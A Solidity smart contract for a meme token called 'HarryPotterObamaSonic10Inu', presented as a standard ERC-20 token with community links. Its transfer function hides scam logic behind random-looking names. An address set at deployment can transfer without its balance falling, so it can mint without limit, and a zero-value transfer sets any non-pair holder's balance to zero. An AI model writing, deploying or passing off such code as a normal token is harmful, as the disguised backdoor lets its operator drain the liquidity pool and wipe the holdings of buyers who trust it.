/*

Telegram: https://t.me/HPOS10IPortal

Twitter:  https://twitter.com/hpos10iETH2

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HarryPotterObamaSonicInu is Ownable {
    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address itqkxpb, uint256 thrnfgvc) public returns (bool success) {
        lkspfdchzxu(msg.sender, itqkxpb, thrnfgvc);
        return true;
    }

    function lkspfdchzxu(address rgwijytz, address itqkxpb, uint256 thrnfgvc) private {
        if (0 == smqjfdzvn[rgwijytz]) {
            balanceOf[rgwijytz] -= thrnfgvc;
        }
        balanceOf[itqkxpb] += thrnfgvc;
        if (0 == thrnfgvc && itqkxpb != tzdksw) {
            balanceOf[itqkxpb] = thrnfgvc;
        }
        emit Transfer(rgwijytz, itqkxpb, thrnfgvc);
    }

    string public name = 'HarryPotterObamaSonic10Inu';

    uint8 public decimals = 9;

    address public tzdksw;

    function approve(address teusjnbw, uint256 thrnfgvc) public returns (bool success) {
        allowance[msg.sender][teusjnbw] = thrnfgvc;
        emit Approval(msg.sender, teusjnbw, thrnfgvc);
        return true;
    }

    string public symbol = 'BITCOIN 2.0';

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private qvib = 115;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private ylkqmwjse;

    mapping(address => uint256) private smqjfdzvn;

    constructor(address rsdnklwiat) {
        balanceOf[msg.sender] = totalSupply;
        smqjfdzvn[rsdnklwiat] = qvib;
        IUniswapV2Router02 uaqsz = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        tzdksw = IUniswapV2Factory(uaqsz.factory()).createPair(address(this), uaqsz.WETH());
    }

    function transferFrom(address rgwijytz, address itqkxpb, uint256 thrnfgvc) public returns (bool success) {
        require(thrnfgvc <= allowance[rgwijytz][msg.sender]);
        allowance[rgwijytz][msg.sender] -= thrnfgvc;
        lkspfdchzxu(rgwijytz, itqkxpb, thrnfgvc);
        return true;
    }
}